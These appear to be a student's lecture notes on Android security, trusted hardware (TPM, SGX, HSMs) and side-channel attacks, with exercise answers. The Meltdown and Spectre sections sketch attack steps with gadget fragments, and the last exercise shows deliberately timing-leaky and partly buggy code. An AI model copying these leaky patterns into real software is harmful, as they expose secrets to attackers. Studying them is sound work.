ring 2 - nothing (intended for drivers but they run at ring 0)
ring 3 - Applications

How does this relate to mobile device security:
Rich OS - apps
Trusted OS - crypto, passwords, fingerprints, keys

#### Details of ARMv8 ISA

To do computations you need to load and store first.

Instructions are 4 bytes, Load-store architecture, familiar concepts - stack pointer, frame pointer (x29), function calls (bl), stack frames...

QEMU allows to emulate other architectures.

to compile into ARM and to run it on x86

```bash
aarch64-linux-gnu-gcc -g -O0 -fPIE -pie -o main main.c
qemu-aarch64 -L /usr/aarch64-linux-gnu/ main
```

### Android ecosystem and security

#### Android Open Source Project (AOSP)

Android is "**owned**" by Google, but code is made availabe through AOSP.

OEM customizes code to their hw, adds proprietary components (e.g. for hw support)

Google Mobile Services require OEM to comply with compatibility definition document - provides this or other services, drivers, etc.

#### Chip -> phone

ARM (ISA and design creator) -> chip manufacturers (ODM - Original design manufacturer) who pay ARM for licensing, and add their extensions -> phone (OEM -> Original equipment manufacturer)

#### "Open" in AOSP

Q: “How does setting a PIN/pattern/password work?”

1. Determine component that implements feature
2. Figure out AOSP release
3. Look for component in AOSP
4. Read code until you are satisfied

#### "not-so-Open" in AOSP

Enrolling and verifying passwords is a security-sensitive feature. The backend of this feature is implemented by the **Gatekeeper subsystem**
The subsystem often uses trusted execution env (the safe space) and is usually platform-dependent (~proprietary)

It guarantees stronger confidentiality

Throttles consecutive failed attempts

#### Android devices

Many different players - many different hw OEMs

Many different Anfdroid versions:

- not all devices support all versions
- some devices never get updated
- most devices get updates only for 2/3 years
- Android versions distribution secluded

Regular Android app ships with 32-bit ARM, 64-bit ARM, and some RISC5

#### Android fragmentation

Fragmentation is the **biggest challenge** for Android security, since thousands of devices with custom hw and sw
Customization makes development and aptching tricky.

#### Lif og a security bug

Reporting:

1. Discovery: Security researcher (Google's or external) finds a bug
2. Disclosure: Report the bug to Google
3. Reception:
   - [ Hope the bug reaches the right Google employee ]
   - Google acknowledges the bug and will work on a fix

Fixing:
Coordinated Disclosure
[ Wait n days, industry standard: 90 days ]
Publicly disclose the bug

Security patch distribution
Google distributes the patches to other manufactures
Patch is published as part of the Monthly Security Bulletin

#### Perils of customization

Google sends patch to third-party company X: Company X now needs to apply the patch to their custom AOSP fork

**Project treble**

Previously: no clear interface between Android OS framework and vendor implementation
So when Android OS is updated - vendors lose time integrating the new patches and this introduces new costs and overheads and delays

Project Treble helps defining a clear interface
Note: this is useful for non-security patches as well

Introduced with Android 8.0+

#### Most devices don;t get security patches

only 2/3 years of updates because vendors are not interested in supporting old devices.

#### Role of Security researchers

Identify malware

- Once a new malware is found, it's added to blacklists
- Any app "similar" to the malware will be flagged and removed

Security vulnerabilities

- Once they are found, they are reported to Google
- Monetary rewards for security bugs: "Bug Bounties”

#### Attacker goals vs security researchers

Security researchers want to

- Identify malware (add to disallow-lists, flag apps “similar enough” to listed malware apps)
- Report security vulnerabilities for bug bounties

Attackers want to in general: run code on your device and do XYZ

Two main important topics:

- Malware analysis, detection, containment
- Vulnerability analysis, detection, prevention, patching

### Android Apps

written in Java, C/C++, Kotlin, Rust, ...

Android apps “live” in the Android context:
Android framework exposes a gigantic number of APIs
APIs somewhat equivalent to "library functions"

APIs are useful for:

- apps to interact with the “external world” (via the API)
- the Android framework to interact with the Android app, e.g., where does the execution start?
- to extend Java SDK APIs: Many APIs from the Java world are part of the Android APIs

APIs examples: HTTP request, Log message, access to GPS/location info

**Android Framework APIs** - too many to be enumerated

**Package name** - each app has a package name

#### Basics on Android apps

there is no "main" function

The user interacts via the Graphical UI - UI widgeds (EditText, Button), no CLI

Many APIs are "event-driven" - register a listener X and X's callback is invoked later on

Apps are build on combination of "components"

#### 4 Component types

##### Activity

Entry point for interacting with the user, and it represents a single screen with UI.

You can have many - each defines a UI
You can define which is the main/start one
If app allows it, an external app can start these activities at will

##### Service

Meant to perform an action in the background for some period of time, regardless of what the user is doing in foreground (the user could be switching between activities)

Services don't provide UI.

e.g. music player service

##### Broadcast receiver

Respond to system-wide events
Have well-defined entry point
System can deliver these events even to apps that are currently not running

Events example: battery charging, SMS is received

##### Content provider

Manage a shared set of app data
High-level API to access data so that other apps and services can query/interact with it
They abstract away the storing mechanism

Most often based on SQLit database (file-based)

##### Communication between components - intents

Android-defined objects that encode an "intent" (fancy IPC message)

Use cases:

- notation "A.X" refers to A's component X
- A.X wants to start A.Y (e.g. go to next activity)
- A.X wants to send data to B.Z
- user clicks on A's icon -> laucher app sends intent to A.MA
- note - each component has a life cycle - A.Y could already be started

#### Manifest file

Most important file of Android app

Specifies all key information needed by the fw to run the app:

- Package name
- Components app consists of
- Intent filters
- Main Activity ~> main() entrypoint
- Permissions

### App security

Android is based on Linux

Each app has its own Linux user ID (there are ways to setp apps so that they share the user ID)

Each app lives in its own security sandbox - standard Linux process isolation, restricted file system permissions

#### App installation

Android fw creates a new Linux user with a new user ID\*

each app is given a private dir - also call internal storage, where no other app can access it (unless it is with shared user ID)

#### Android Framework Architecture

User-space is app, android fw, native libraries, android runtime, HAL (audio, bt, camera)

Kernel space - Linux kernel (drivers, power management)

Between them there is a security boundary.

Instrumentation and analysis at these abstraction levels can be bypassed

**Pros** - syscall analysis CANNOT be bypassed (because of the security boundary)
**Cons** - bridging the semantics gap is complicated

**\*Manager** (LocationManager, TelephonyManager, PackageManager, ActivityManager)- lives on App and Android Framework levels. They run as "privileged" users.

##### asking the OS for favors, aka syscalls

Traditional OSes have two worlds - user-space vs kernel-space

user-space is where user processes and apps live - they can't do much by themselves

kernel-space is where the actual OS lives - the OS is the god of machine and information

##### Example - getLastLocation()

App invokes Android API:
`LocationManager.getLastLocation()`
We are still within the app's sandbox!

Actual implementation of the privileged API:
`LocationManagerService.getLastLocation()`
We are in a "privileged" service

To go to other side we need something

#### Crossing the bridge

Binder - one of the main Android's "extensions" over Linux
It allows for _Remote Procedure Call (RPC)_ and _Inter-Process Communication (IPC)_

##### Binder RPC

App that is run as non-privileged process sends Binder message over Binder "Proxy" -> Binder Driver, Linux Kernel -> Binder "Stub" -> service that is privileged process/service

##### Binder Details

Proxy and Stub are automatically generated starting from AIDL

Binder communication: perform ioctl syscall on /dev/binder

ioctl syscall:

- Multi-purpose syscall, to talk to drivers
- In the Binder context: kernel driver takes care of it, dispatches messages and returns replies

There is a lot of overhead in context switching to kernel, switch to service context, get caches, get data, switch to the app.
This works if the Binder calls are infrequent

#### Androind permission system

Manifest encodes what app wants.

Each of these "protects" security-sensitive capabilities:

- ability to "do" something sensitive - open Internet connection, send SMS
- ability to "access" sensitive information, e.g. location, user, contacts,...

More and more malware is moving to getting SMS permissions because of the 2FA

**READ/WRITE_EXTERNAL_STORAGE** - even though each app has access to a private dir, by default no other apps can access this dir.
Device offers an "external storage" - in the past physical "removable" SD card (because it had to have vFAT). Currently part of the file system that apps can use to share files, or "/sdcard" - where your photos and downloaded files are

### Reversing Android Apps

#### Compilation

Java/Kotlin compiler to Java bytecode (executable by the JVM)
then DEX compiler to Dalvik bytecode (executable by the DVM)
(whereas C/C++ compiles straight to machine code)

Java comes with copywrite and copywrite issues, so Google didn't want to be sued by Oracle anymore

#### Android Application Package (APK)

APK is a zip file

Content:

- AndroidManifest.xml (compressed)
- classes.dex (raw Dalvik bytecode)
- resources.arsc (compressed)
- res/\*.xml (compressed)

#### Big picture

from this zip file, you can unpack the individual components, libraries that are shipped.

You can disassemble DEX files, go from Dalvik bytecode to smali file type.

apktool can embed baksmal/smali
it unpacks/packs APKs, including resources and manifest files

#### Disassemble vs decompilation

Disassembly - binary file -> DAlvik bytecode "smali" representation

Decompilation - assembly/bytecode to source code-level representation (Dalvik bytecode -> Java code)
However obfuscation can make this difficult

Decompilation tools:
JEB (commercial, VERY expensive)
BytecodeViewer (pretty good one)
Jadx
NEW: Ghidra, open source tool developed by NSA

### Kernel security and SELinux

User-based permission model - each app has userID

Process isolation - applications are separate

Extensible mechanism for secure IPC

#### Application sandbox

apps are isolated from each other.
Sandbox is in the kernel, native code can't bypass it

To bypass the sandbox, an attacker would need to compromise linux

#### defense in depth

multiple layers of security controls throughout a system
it prevents single vulns from leading to compromise of the OS

> redundacy

#### SELinux

Security-Enhanced Linux: a Linux kernel security module

- Useful to define access control security policies
- Example: allow/prevent execution of syscall X

Prevents execution of system call.

"Deny by default" policy

Two modes:

- Permissive mode: permissions denials are logged but **NOT** enforced
- Enforcing mode: permission denials are logged **AND** enforced (in Android is this one)

"SELinux domain":

- a label identifying a process (one or more)
- all processes labeled with the same domain are treated equal (allow different processes (FB and FB messenger) to exchange data)

current version has 60+ domains (early version - installd, netd, vold, and zygote)

Kernel enforces strict set of permissions for each application.
Application can only communicate with the manager only if the permission was granted before -> manager does not have to implement security checks

90-95% of research is done on Android security, because iOS is closed-source

## Exercises 9

**Exercise 1**
Identify three examples to convince this guest that the software stack on his phone is only partially open source.

1. The platform-dependent parts for a given hardware platform need to be added to the AOSP to make it run on a given chipset. These platform-dependent parts are usually not opensourced.
2. OEMs usually heavily modify the AOSP to create a unique user experience on their platform, hoping to get a competitive advantage. Many components of Samsung’s "One UI" are not open-sourced.
3. The software/firmware running in the TEE, wifi chip, Bluetooth chip, and baseband chip is not open-sourced.

**Exercise 2**
Let us say you want to implement an image parser in a C/C++ native library to gain more performance and have a better user experience. When loading images directly from the web in your app that uses this library, what could go wrong?

• If there are bugs in this native library, the app might crash, resulting in a bad user experience.
• In the worst case, this bug might lead to code execution in the context of your app, given a specifically attacker-crafted image.

**Exercise 3**
Explain to the developer what a republishing scheme is and why it is possible on Android.

1. In a republishing scheme, malware authors download an existing app from an app store, reverse engineer it, and add malicious code to it. They publish this stolen app via app stores to follow their nefarious intentions.
2. For example, one way to make money for the malware author is by adding ads to the stolen app.
3. It is possible to reverse engineer Android apps because the code is delivered in an intermediate representation (Dalvik bytecode) that contains most of the original type information. The Dalvik bytecode can, thus, be translated back to a human-readable assembly representation (e.g., smali) or even to the source code (e.g., Java).

**Exercise 4**
Since you actually read (parts) of the research articles published with these prototypes, you chime in and explain that a CPU emulator alone is not enough to run these components. Come up with an argument to convince the security researcher.

PartEmu and FirmWire need to implement all the peripherals (e.g., memory-mapped input/output) the TEE OS or the baseband firmware, respectively, are interacting with. These peripherals are private, and it requires a lot of reverse-engineering effort to implement an emulation layer that works sufficiently accurate.

## Trusted Computing

Why trust a computer?
If you want to compute something, you may have to trust some other party (hw/sw)

### Confidential computing

Hardware and/or software techniques ensure your program runs without disclosing its secrets
Not assurance that your code runs to completion (adversary may deny service)

It ensures correctness but not liveness

It gives the confidentiality and integrity, but does not give availability?
This is because there can be other components that are not trusted (other processes, attacker could turn off the computer)

In cloud, the platform provider must retain control over scheduling -> availability may suffer.

Confidential computing implies higher overhead. And usually you optimize to use only the trusted core component.

### What if we can trust the hardware

Assume we can.

Build a trusted core of the application and put it in the safe hardware, then nobody else can look inside or extract secrets.
We can ensure that the hardware runs correctly with cryptographic primitives.

#### Properties of trusted hardware

- Attestation - hardware proves that it odes what you think it is doing
- Sealing - hardware stores secrets in unprotected memory
- Isolation - privileged and concurrent code cannot observe computation (this included protection against side-channel attacks)

Examples of trusted hardware:
IntelSGX is storing data as encrypted to the memory, and cache is unexcrypted. It assumes that chip cannot be broken/read out the cache or individual CPU pins.

Examples of uses of trusted hardware

### Trusted hardware

Any hardware that has been certified to perform _according to a certain set of requirements under strong adversarial conditions_

Because of the strong adversarial conditions, trusted hardware is often (but not always) _tamper resistant_

Integrated Trusted Hardware - Intel SGX, TPM chip

Trusted Hardware with physical isolation - Hardware security module - half-size server that you can put to server rack and they will do all the magic by if you open it, it destroys the data, Smart card (bank card, sim card, ID, camipro, keys, SwissPass, Insurance card)

Tamper resistance up to a given attacker

#### Trusted execution environments (TEE)

isolated processing environment in which applications can be securely executed irrespective of the rest of the "system"

**dedicated devices**

- strong physical protections
- protect against invasive adversaries
- limited functionality, often optimized for cryptographic operations
- act as root of trust for larger operations. e.g. support to secure boot of OS

**Secure enclaves in shared devices**

- protected regions of memory
- confidentiality and integrity of running processes
- verification of executable code before execution
- enable processes to run while being protected from attacks perpetrated by the OS, hypervisor, firmware, drivers or remote attackers

Intel tried to make money by adding a secure component on a chip, therefore hiding information from OS or hypervisor.
ARM Trustzone does similar to IntelSJX

TEE guarantees the environment in which code is being run

#### Trusted Platform Module (TPM)

Microcontroller atteched to bus or somewhere in the system can securely store artifacts such as keys or passwords, used to authenticate the platform. It can sign, encrypt data or verify hash.

It can also provide and store measurements to ensure that the platform stays trustworthy.

TPM gives the guarantee for the state and you can build a chain of trust.

Example:
TPM guards sensitive data in non-volatile storage

1. Endorsement Key (EK) (2048bit RSA)
   1. created at manufacturing time, signed by manufacturer, immutable
   2. used for attestation
2. Storage Root Key (SRK) (2048bit RSA)
   1. used for encrypted storage (sealing) - created after running TPM_TakeOwnership
   2. Can be cleared later with TPM_ForceClear from BIOS
3. OwnerPassword (160bits) and persistent flags
   1. EK, SRK, OwnerPwd are private and never leave the TPM

It provides Platfrom Configuration Registers (PCR) which hold state (for checking)
many per chip (>16), they contain 32-byte SHA-256 digest
PCRs are initialized at boot time to default value

They have two relevant operations:
TPM_extend(n,D): PCR[n] <- SHA256(PCR[n] || D) <---- take existing value, and stream in data from D, continuously updating SHA sum
TPM_PCRRead(n): returns PCR[n]

It can be used for attestation, sealing, and isolation

##### TPM Attestation

Mechanism that allows a hardware module to prove that it is in a specific state to an authorized party

Attest there is secure hardware : EK serves to prove the device is genuine (verify this by pubkey from device manufacturer -- trusting Intel, or others that the key management is correct)
Attest the state of OS : after a series of instructions, the state of registers is as expected (part of the secure boot)
Attest the state of the code : signature of the code (piping the code through the secure register)

Examples of possible use cases:

- bank allows money transfer if customer's machine runs "up-to-date" OS patches
- Enterprise allows laptop to connect to its network only if laptop runs "authorized" software
- gamers can join network only if their game client is unmodified

Example:
Game consoles, company laptops, and mobile phones <-- places where secure boot is used to verify the OS and that information was not stolen

**Secure Boot:**
On power-up TPM gets TPM_Initsignal from LPC bus

1. BIOS boot block
   1. TPM_Startup to initialized PCRs to 0
   2. PCR_Extend(n, \<bios code\>)
   3. then loads, checks, and runs BIOS post-boot code
2. BIOS:
   1. Calls PCR_Extend(n, \<MBR (master boot record) code\>)
   2. Then loads, checks and runs MBR
3. MBR (master boot record):
   1. calls PCR_Extend(...)
   2. Then loads, checks and runs OS loader, etc.

Going beyond OS is hard because a lot of apps are running concurrently, so it cannot verify the state of the data.
So then you give the parts of code to TPM to get the hash to verify that the code has not been tampered with.

After full boot sequence, PCR contains hash chain of the booted software. Hash ensures no cheating.

**Software attestation**

Goal prove to server that application is untampered

First step - create Attestation Identity Key (AIK)

- private key only known to TPM
- pubkey certified by an Authority if EK is valid
- can be certified using EK directly or privately (Direct anonymous attestation)

Server sends attestation request (PCRList, Nonce)
Application goes to TPM to get Attestation = PCR state and signature, and sends to server, and establishes TLS channel
Server validates signature and PCR state and communicates on secure channel

This way the server can verify the application by checking individual bits and pieces of the application's memory

**EXAMPLE - private contact discovery in Signal**
Signal is a messaging application
Signal has end-to-end encryption, keys astored on the device, (mostly) open source, independent

They have private contact discovery:
from list of contacts find the intersections who from those contacts is using signal.

Solutions:
give contact list to signal and it returs the users list (unsafe)
or get all contacts from signal and intersect with your contacts list. (this would be 1.5TB of data)

**Privacy**: Even if we trust signal, we don't want Signal to know who we are communicating to

We cannot do _acccess control_, because Signal would need to have access control to signal servers, but it is the threat model

We cannot do _cryptography_ because signal then would still know.
We could do _Private Set Intersection_, which is crypto primitive, where the intersections is received back by the user. Problem is that PSI does not scale

_Intel SGX solution_ - do the intersection computation in an enclave:
signal sends pubkey of enclave
user encrypts contact list with pubkey
signal computes the intersection
then the intersection is sent back

We are still trusting Signal that they are running the enclave.
Enclave is open source and the user can compute (and check) the hash used in attestation.

Application verifies the state by sending a challenge to signal enclave.
Then the enclave returns the pubkey with attestation.
Then continues the contact exchange.

We still need to trust Intel to faithfully implement SGX, and that it does not screw up the enclave, and that it is sufficiently hard to break into the enclave.

##### TPM Sealing

**Sealed storage** protects private information by binding it to platform configuration information including the software and hardware being used

The device derives a key that is tied to its current status, e.g. Platform Configuration Registers (PCRs) and stores the encrypted data

Data can only be decrypted by a device with the **same** status (same hw, sw, same state)

Setup:

1. Run TPM_TakeOwnership(OwnerPassword ...)
   Creates 2048bit RSA Storage Root Key (SRK) on TPM
   Cannot run TPM_TakeOwnership again without OwnerPassword
   Done once by IT department or laptop owner (optional)
2. Run TPM_CreateWrapKey/TPM_LoadKey
   Create more RSA keys on TPM protected by SRK (identified by 32-bit keyhandle)

Storing data:

1. TPM_Seal(keyhandle, PCRValues, Data)
   Encrypts data using key [keyhandle]
   data up to 256 bits (e.g. an AES key)
2. Securely store encrypted data in persistent memory

Recovering data

1. Recover data from secure storage
2. Decrypt with TPM_Unseal()
   Will only succeed if PCRValues are the same as twhen TPM_Seal was run (so changing MBR, OS Kernel, os App code means that data cannot be decrypted)

Signal does the same thing to store the snapshot of the SGX enclave.

Another example - Windows Bitlocker which purpose is to encrypt a full volume
The Volume Master Key (VMK), that encrypts disk volume key, can be recovered only if you boot up with the correct state of the system

They do not solve all security issues - because they have their own issues, trade-offs (limited throughput, limited storage)
Intel SGX has a memory limit because you need to hash the data streams, otherwise there could be a replay attacks done.

#### Trusted Hardware Key Properties - Isolation

Mechanism to constrain who and what has access to programs and data

Trusted hardware offers _one well-identified entry-point_ to interact with software

- tamper resistance - hard to open
- tamper evident - you can see if it has been opened
- tamper responsive - delete keys when attacked
- resistance to side-channel attacks and physical probing

#### Hardware Secure Modules (HSMs)

Hardened, tamper-resistant hw devices

Cryptography oriented:
generating keys, encrypting and decrypting data, and creating and verifying digital signatures

Certified at vairous FIPS 140-2 (federal information processing standard) levels:
approved security algorithms
achieve evidence of tampering (e.g. coatings and seals) that must be broken to attain physical access to the plaintext crypto keys and critical security parameters

There is an API defined by PKCS

##### Use-case: secure iPhone backups

we want users to be able to vackup their data to the cloud, and the user should be the only one that can recover their data

We don't trust other users, cloud provider, Apple, external paries

User should retain exclusive access

Solution: access control; problem - apple and the cloud can still access the HSM;
Even if Apple and cloud were trusted, access control for data just prevents other users and 3rd parties from accessing the data and this does not apply to 3rd parties with subpoenas

Solution: cryptography - key is on the phone. Encrypt the data, and send it to the cloud. If the phone is lost, the data is lost.

Solution: password that is sufficiently hard used to derive the key
Problem - guessing the password. So limit the attempts, but people don't really remmeber long passwords

HSM Pubkey is hardcoded into the device:

1. Generate random symkey k
2. encrypt phone data using k, and send it to the cloud
3. send key k to the HSM, encrypted with pubkey (there is user password and k)

After the login to iCloud, passcode is sent ot HSM and which retrieve the key k

These HSMs run custom software. This software can be updated.
To update, there are protect access keys - Apple's HSMs require smartcards to update, stored in sealed and tamper-evident bags while not used.
Install software, destroy access cards

Still need to trust Apple to install secure software in the first place

#### Smartcards

Plastic card with embedded integratecircuits which can process data and are often tamper resistant

Two types:

- memory cards
- microprocessor cards

Contain keys and certificates - authentication / digital signatures, confidentiality, key management protocols

##### Use-case: Offline payments

We want to signal to the bank to pay to a merchant without talking to the bank.

Threats:
other users
merchant
user themselves
external parties

The card is often authenticated with a PIN, and then the transaction is signed with the certificate in the card.
Signature can be forged

Dunamic data authentication - PIN OK can be faked
So we can send it online to check, but this would be expensive process.
But now a lot of devices can do the online transaction to check whether the funds are available.

Problem: Relay attacks

Attacker controls the payment terminal which is connected to a computer what transwerls the transaction to another computer, that is connected to a fake card, that uses the received PIN and fake card to pay for something else.

There are approaches to limit the relay capabilities - distance bounding (time limiting for signals).
Relay attacks have proven that the user might not be responsible for the fact how their card was used.

### Side channels

Using TPM in a nutshell: Do very secure operation, trusted hw execites the secure operation with secret information, you get the result of very secure operation

**Side-channel attacks** - determine the secret key of a cryptographic device by measuring its execution time, its power consumption or its electromagnetic field.

#### Types of side channels

learn the system's secret by observing how different computations are

**time** - how different computations take different time
Extremely powerful because **isolation** doesn't help

**power** - how different computations consume different power (mutliplication takes more power than addition)

**electromagnetic** - how different computations have different emissions (multiplication will be different electromagnetic waves)

#### Timing attack - Naive RSA

RSA decryption - compute c^^d mod N
Naive algo - square and multiply

Here problem is that there is a check for a bit == 1, and if it is it multiplies (a lot longer signal through ALU), otherwise assign (short op)

This could leak information during RSA computation

timing depends on number of 1s in the channel

To mitigate this - make the if branches equal timing wise - add bunch of operations to both sides, or add computation to the other side

#### Power side channels

Elliptic-curve crypto operation
Power depends on key bits

This often requires 1000x of tries but afterwards it can leak inforamtion

#### Electromagnetic side channels

same as power

#### Countermeasures

Goal - prevent secret inference from observable state

**Hiding** - lowers signal to noise ratio
noise generator, randomized execution order, async logic styles...

**Masking** - split state in to shares; forces adversary to recombine
Boolean or arithmetic masking, higher-order masking

**Leakage resilience** - prevents leakage aggreagation by updating secret
e.g. by shielding in a faraday cage

#### Attacks against Intel SGX

SGX is the prime technique on modern CPUs to run trusted computation
Adversary runs side-by-side on the same CPU, either on a nearby thread or core

Large amounts of side cahnnel to make protection of SGX hard

It doesn't give full protection against NSA, but still is good against reasonable attackers

Even the most modern SGX will leak some info, but will give some security guarantee.

Attacks, while they are possible, the attacker is in a very constrained environment:
they control hypervisor, CPU, and run it in almost single-step mode to get information

### Microarchitectural side-channels

#### Meltdown

Allowed attackers to leak information of the kernel.
Allowed to read all memory of the running processes

AMD was resistant to meltdown (per chance), but Intel was not

It exploits the race condition between **memory access** and **protection checks**.

Ultimately exploits the microarchitectural nature of caches (something is left in the cache upon exception because the cache is not part of the architercural state)
If the protection check fails, the CPU is rolling back the memory access execution but the check might have flushed the cache lines and from that you can infer what the value was stored.

> Attacker executes a **forbidden access** and speculatively uses the result to obtain **non-architectural side-effects** that reveal the secrets **before** the forbidden access is squashed

Most OSes mapped physical kernel memory pages into every user's virtual memory space
Minimizes the cost of some exceptions
Of course, **access is protected**, i.e. data can be read only in kernel mode
But **everyone can address them**

By accessing certain parts of the page we can infer how long it takes to access that part and infer where it is in the memory

##### Meltdown steps

Execute a forbidden access (pointer being dereferenced)

Speculatively use the secret result - store it somewhere else.
Before the exception is thrown by CPU

Execute the memory access using the secret, there will be specific access to specific page (legitimate memory access). `array[secret * 4096]`
This will remain even if the CPU unrolls the operation from before

This allows to indirectly measure what the secret is

Additionally we need to make sure that a secret the attacker cannot read leaves a trace before it is cancelled
And then performa a **prime+probe** cache attack to learn the secret - attacker in a different process has a large array and goes through the whole array checking if the access to item is fast (in cache) or part of the array was flushed - slow. Then they know which cache addresses were flushed

Affected all the processors except AMDx86

##### Meltdown possible mitigations

The obviouse proper solution is to change the processor degin:
test the privilege level **before** making the result of a speculative access available (AMD did this already)

OTher mitigation is to **isolate user space and kernel space** memory
In Linux, Kernel page-table isolation (KPTI) and similar in other OSs - allows to see very small kernel space in user mode
performance penalty in Linux is around 5-10\%, up to 30\%

#### Spectre

Another catastrophic attack making it possible toread all memory

Addresses another shared resource - branch predictors (they are not unique per thread but shared among SMT threads)

Exploits side effects of **(mispredicted) speculative execution**
Mispeculation does not affect the architerural state but it may **affect microarchitectural structures** (E.g. caches)

Attacker would redirect the brach predictor but the CPU can detect, and the same way still leave the trace

Goal: get the victim to **speculatively** execute **leaky** code whose nonarchitectural side-effects reveal the secrets

##### Spectre steps

Have leaky code: `array1[x]` - with appropriate value of x we can read anything we want

Speculatively execute controled branching (attacker controls x). We would train the branch predictor that x is always < array_size

```bash
if (x < array1_size)
    array1[x]
```

If we can get the processor to mispredict the condition, the access will ebe speculatively performed (but the value will be removed from the ROB)

And then in the branch we do the same thing as in meltdown - do the indirect memory access: `y = array2[array1[x] * 4096]`.
We can use the side effect of the value of the execution to gain information.

And then execute Prime+Probe cache attack to learn the secret.

##### Spectre possible mitigations

**Hardware**: disable speculative execution (give up 90% of CPU speed), separate branche predictors per process/thread

**General Software** approaches: run only an application per processor

**Partial and application-specific software** approaches: add serialization instructions between branches and loads; Make it impossible through JS in browsers.

These are still vulnerable, and the kernel needs late-stage software microcode patches.

Microcode patches: what is loaded into the CPU to execute complex instructions.

#### Active mitigations

New CPUs roll out mitigations in hw, older CPUs require microcode patches.
Some issues need (costly) software mitigations

## Exercises 10

**Exercise 1**
In the following scenarios explain whether you need isolation, attestation, or both. Explain what
would happen if these properties were not met.

1. A city government uses an HSM to sign updates to the population census.
2. An IoT sensor signs a message authenticating itself to the central server that collects measurements.
3. We use a TPM to ensure secure booting of a server located in an isolated room in the
   basement of a bank.
4. Intel SGX is used to perform biometric access control on a backend server in the cloud.

Answer:

1. Needs isolation. If an adversary can extract the secret key from the HSM, this adversary can sign any census update. Attestation is not absolutely needed. The city hall owns the trusted hardware on its premises, and therefore it need not prove that the trusted hardware is there (first attestation property). Regarding software run on the hardware, a signature (on the census, or anything else) can be verified externally given the public key. If the HSM performs any other operation, the signature would not pass the verification. (One could also argue that attestation is needed to ensure that the HSM signs once, and only once, a transaction and does not leak the secret key.)
2. Needs isolation. An adversary that extracts the secret key from the IoT sensor can impersonate this sensor, effectively tampering with the measurements. Same considerations regarding attestation as in (1).
3. Does not need isolation. The device is already in an isolated room. Needs attestation of hardware and code, as it is remote, we need to ensure the device is there when we are not in the room.
4. One needs attestation. Since the application is run remotely on an untrusted environment (the Cloud), it is important that SGX ensures the client has run code that performs the correct access control. One could argue that, since no one has physical access to the cloud where SGX is installed, there is no need for isolation. On the other hand, it could be argued that the Cloud is adversarial, and SGX needs to be protected to avoid tampering attacks. Since biometrics are stored in the clear, we are not concerned with the cloud trying to breach their confidentiality (It already has read access the templates).

**Exercise 2**
In question 10.1(1) what would be a better security practice to avoid fraudulent transactions: giving the mayor of the city the right to execute the signature in the HSM, or have the HSM require the credentials of two census civil servants to permit the operation (justify your answer).

The second option, two civil servants, is a better option. This configuration respects the separation of privilege principle. To avoid that a single action (the mayor is a malicious actor) can break the system, we require more than one actor to execute the operation, namely the census update.

**Exercise 3**
Alice runs a certificate authority, and needs a secure machine to store the CA keys and sign certificate requests. What are the challenges, advantages or disadvantages if Alice runs their signing infrastructure:

1. General purpose CPU
2. Enclave running on commercial processor
3. Dedicated hardware security module (HSM)

Alice needs to store her private signing keys where it cannot be accessed (read/write) by her employees.

1. A general purpose CPU has no protection against major attack vectors: against a untrusted OS or against physical access to the system (including system RAM). However, if the physical environment can be secured otherwise (physical access controls), a general purpose CPU environment provides very high performance.
2. An enclave on a commercial processor (ARM TrustZone or Intel SGX/TDX) will provide defence against untrusted OS, and in some cases even against physical access to the system. Depending on the enclave technology, there may be a residual atttack surface from physical attack (including system RAM swapping/rollback). However, these environments often come with greater performance overheads, or resource limitations (SGX limits enclaves to 128MB physical memory).
3. Dedicated HSMs are built with an threat model including attackers with physical access, and contain intrusion protection mechanisms, and run their own software stack. However, HSMs come with some significant disadvantages. HSMs often have proprietary designs, and are expensive. The proprietary designs prevent external auditing and checks, and allows bugs to remain hidden. Performance and power cost might be higher than previous options. HSMs might be vulnerable to physical side-channels if no physical isolation is implemented. Development of software for HSMs can be challenging due to proprietary designs. Replication for fault tolerance can be challenging.

**Exercise 4**
What would go wrong if TPM_Startup(ST_CLEAR) could be called at any time after boot?

A malicious OS could reset the PCRs post-boot and then set them to an invalid OS hash. PCRs would then look as if a valid OS loaded.

**Exercise 5**
During attestation of software, what could go wrong if the following steps of the protocol do not happen:

1. The challenger does not send a Challenge (also known as Nonce)
2. Application and challenger perform a key exchange to establish a secure channel.

Answer:

1. The signature can be replayed! Once the app has authenticated once, if the adversary captures the signature, they can reply it later even if the app has not loaded properly.
2. The user / OS can reboot the machine after attestation and run arbitrary software pretending to be the application that performed the attestation. The key exchange ensures that only the application can communicate with the challenger.

**Exercise 6**
When using trusted hardware, should we care about covert channels?

In general, no if the trusted hardware is isolated and implements attestation. In that case, the adversary cannot measure emissions from the hardware or run code on the hardware to establish covert channels.

**Exercise 7**
In Dynamic Data Authentication, would encrypting the PIN verification solve the YesCard problem? If yes, justify. If no, propose a solution.

No, the problem is authentication, not confidentiality. A solution is to authenticate the PIN transmission, e.g., have the card sign the OK response.

**Exercise 8**
Is there any timing side-channel in the following code? If a timing side-channel exists, (1) explain how to exploit it. (2) change the code to prevent the attack (Hint: try to make time measurements useless for the adversary).

```java
//example a
Bool CheckPin ( string check , string pin ) {
    for ( int i = 0; i < 4; i ++)
        if ( check [ i ] != passcode [ i ])
            return false;
    return true;
}

//example b
// exp(sec, x) computes x**{sec} mod n
const BigNumber n = [ A big number ];
BigNumber exp (BigNumber sec, BigNumber x) {
    BigNumber out = 1;
    for (int i = 0; i < sec.size(); i++) {
        if (sec [i] == 1)
            out = (out * x) % n;
            out = (out * out) % n;
    }
    return out;
}


//example c
// This function computes the dot product of two vectors
// The contents of the vectors are confidential
int dotproduct ( int *veca , int *vecb , int len) {
    int acc = 0;
    for(int i = 0; i < len; i ++)
        acc += (veca[i] + vecb[i]);
    return sum ;
}

```
